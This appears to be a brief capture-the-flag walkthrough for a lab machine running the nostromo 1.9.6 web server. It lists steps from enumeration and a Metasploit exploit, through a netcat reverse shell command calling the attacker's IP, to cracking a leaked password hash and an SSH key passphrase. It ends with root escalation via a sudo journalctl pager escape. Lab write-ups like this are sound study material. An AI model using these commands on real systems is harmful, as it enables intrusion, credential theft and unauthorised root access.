# user:
  - nmap.txt
  - run dirb on it to find interesting directories
  - look at request headers, server is running nostromo 1.9.6, look up exploit
  - metasploit module to get a "shell" (not an interactive shell, u can't cd because it just sends the command and prints the output)
  - drop a nc reverse shell by setting up a nc listener locally and running 'nc -e /bin/sh 10.10.14.4 1337' remotely
  - /var/nostromo is interesting
  - go into /conf/ and cat .htpasswd for: "david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/"
  - hash analyzer online says it's an MD5-Crypt
  - couldn't get john (or hashcat or online cracker) to crack the password
  - look at /var/nostromo/conf/nhttpd.conf (notice the homedirs and homedirs_public options)
  - read the nhttpd docs to find out what this does (you can visit http://10.10.10.165/~david/, but I couldn't figure out how to do much else)
  - from the docs, it looks like public_www is a directory in /home/david and it's supposed to be public so try to cd there in the www-data shell
  - you can cd into /home/david/public_www as www-data
  - from there, find the backup ssh keys and transfer to your computer with nc
  - try to ssh in as david, but there's a password on the SSH key
  - ssh2john to get a john-compatible hash
  - 'john ssh_pw' yields the password is "hunter"
  - ssh in as david
  - user pwned

# root:
  - dig around in david's bin/ directory
  - find ee.sh script, looks like you can run sudo on journalctl
  - GTFOBins for journalctl
  - run '/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service'
  - then do a '!/bin/bash' to drop a root shell
  - root pwned
